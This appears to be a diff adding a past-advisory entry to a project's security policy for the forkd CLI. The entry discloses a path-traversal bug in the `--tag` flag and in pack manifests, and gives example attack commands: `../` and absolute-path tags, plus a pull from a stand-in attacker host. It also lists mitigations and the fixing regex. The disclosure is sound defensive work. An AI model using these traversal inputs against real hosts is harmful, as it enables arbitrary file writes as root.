@@ -72,3 +72,79 @@ or mitigation within 14 days for confirmed issues.
 
 Pre-1.0 releases receive fixes only on the latest minor. The CHANGELOG
 records which API versions are affected by each advisory.
+
+## Past advisories
+
+### 2026-05-13 — Path traversal via `--tag` (CVE-class, fixed in 0.1.3)
+
+**Affected**: forkd CLI 0.1.0 through 0.1.2 inclusive.
+**Fixed in**: 0.1.3.
+**Severity**: High (local file write as the running user; high impact
+under the typical `sudo forkd` execution model).
+**Discovered**: internal bug-bash, May 2026.
+
+**Description**
+
+`forkd` CLI commands that accept a `--tag` flag computed their
+destination directory as `data_dir().join("snapshots").join(tag)`.
+Rust's `Path::join` silently discards the base when the right side is
+absolute, and the implementation did not reject `..` segments. Several
+attack shapes worked:
+
+```bash
+# Writes Firecracker snapshot files to /etc/forkd-bad/
+sudo forkd snapshot --tag /etc/forkd-bad ...
+
+# Climbs out of the data dir
+sudo forkd snapshot --tag ../../../etc/forkd-bad ...
+
+# Or via a malicious pack: manifest.toml declares tag = "../../etc/x"
+sudo forkd pull https://attacker.example/evil.tar.zst
+```
+
+The same code path is hit by `forkd unpack`, `forkd push`, `forkd pull`,
+`forkd fork`, and `forkd pack` (read-only for the last two but with
+confusing error messages).
+
+**Impact**
+
+- Anyone who can influence the `--tag` argument can write arbitrary
+  files at any path the forkd process is allowed to write to.
+- Files written include `memory.bin` (typically hundreds of MiB to
+  several GiB), `vmstate`, `rootfs.ext4`, and `snapshot.json`.
+- Most serious under `sudo forkd` (the typical KVM-required deployment
+  model), where the writes happen as root.
+- For Snapshot Hub users: a malicious or compromised pack on the hub
+  could declare `tag = "../../etc/something"` in its `manifest.toml`
+  and write its files anywhere the running user can write, on every
+  host that pulls it. This is the canonical supply-chain shape.
+
+**Mitigations available before upgrading**
+
+- Do not run `forkd` with `sudo` for tag inputs that aren't a fixed
+  literal you control.
+- Do not `forkd pull` snapshot packs from untrusted publishers until
+  you have 0.1.3 or later installed.
+- The exploit requires the attacker to influence either `--tag` or
+  the `tag` field inside a pack's `manifest.toml`. If your operator
+  workflow always passes a hardcoded tag and never pulls a third-party
+  pack, you are not exposed.
+
+**Fix in 0.1.3**
+
+Added a `validate_tag()` check applied at every CLI surface that
+accepts a tag (`snapshot`, `fork`, `pack`, `push`, `unpack`, `pull`),
+and again on the `tag` field read from `manifest.toml` inside a pack
+before any path is derived from it. The allowed shape is:
+
+```
+[A-Za-z0-9_][A-Za-z0-9._-]{0,63}
+```
+
+1–64 characters, starting with an alphanumeric or underscore. This
+rejects empty tags, absolute paths, `..` segments, leading dots/dashes,
+slashes, shell metacharacters, and anything else that could affect
+path computation.
+
+**Credits**: discovered and fixed internally during a bug-bash session.
+No external reports.
